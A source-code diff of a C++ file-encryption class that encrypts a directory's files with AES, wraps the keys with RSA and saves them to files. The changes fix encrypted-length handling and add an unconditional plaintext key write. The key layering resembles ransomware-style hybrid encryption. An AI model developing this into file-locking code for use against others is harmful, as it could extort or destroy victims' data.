@@ -57,7 +57,7 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
         //LOG_TRACE("Length of AESKEY: " << aeskey.length() << " and length of AESIV: " << aesiv.length());
         butterfly::writeBinFile("AESKey_protected.txt", aeskeypair.c_str(), static_cast<long>(aeskeypair.length()));
     }
-
+    butterfly::writeBinFile("AESKey_protected.txt", aeskeypair.c_str(), static_cast<long>(aeskeypair.length()));
     for (auto &file: files)
     {
         //LOG_TRACE("FILE: " << file);
@@ -78,13 +78,13 @@ void Encryptor::encryptCPrivateRSA()
     try
     {
         // Encrypt the CPrivateRSA.pem file string
-        _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
+        int encMSGLen = _rsaEncryptorCPrivateRSA->encryptEVP(cPrivateRSAPKey, cPrivateRSAStr, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
         //_rsaEncryptorCPrivateRSA->encrypt(cPrivateRSAPKey, cPrivateRSAStr);
         // Get the encrypted CPrivateRSA.pem string
         std::string cPrivateRSAEnc = _rsaEncryptorCPrivateRSA->getEncryptedMessage();
         // Save the encrypted CPrivateRSA string to CPrivateRSA.bin
-        _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc,_rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));
-
+        //_rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc,_rsaEncryptorCPrivateRSA->getEvpPkeySize(cPrivateRSAPKey));
+        _rsaEncryptorCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, cPrivateRSAEnc, encMSGLen);
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
@@ -115,14 +115,12 @@ void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const st
     try
     {
         // Encrypt the AES Key String
-        _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr, type);
+        int encMSGLen = _rsaEncryptorAESKey->encryptEVP(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr, type);
         //_rsaEncryptorAESKey->encrypt(_rsaEncryptorAESKey->getEvpPkey(), aesKeyStr);
         // Get the encrypted AES Key String
         std::string aesKeyEnc = _rsaEncryptorAESKey->getEncryptedMessage();
-        LOG_TRACE("LENGth of AESKEYENC in finalaeskey: " << aesKeyEnc.length())
         // Save the encrypted AES Key to AESKey.bin
-        //_rsaEncryptorAESKey->writeEncMSGToFile(filename, aesKeyEnc, static_cast<int>(aesKeyEnc.length()));
-        _rsaEncryptorAESKey->writeEncMSGToFile(filename, aesKeyEnc, _rsaEncryptorAESKey->getEvpPkeySize(_rsaEncryptorAESKey->getEvpPkey()));
+        _rsaEncryptorAESKey->writeEncMSGToFile(filename, aesKeyEnc, encMSGLen);
     } catch (RSAEncryptionException &e)
     {
         std::cerr << e.what() << std::endl;
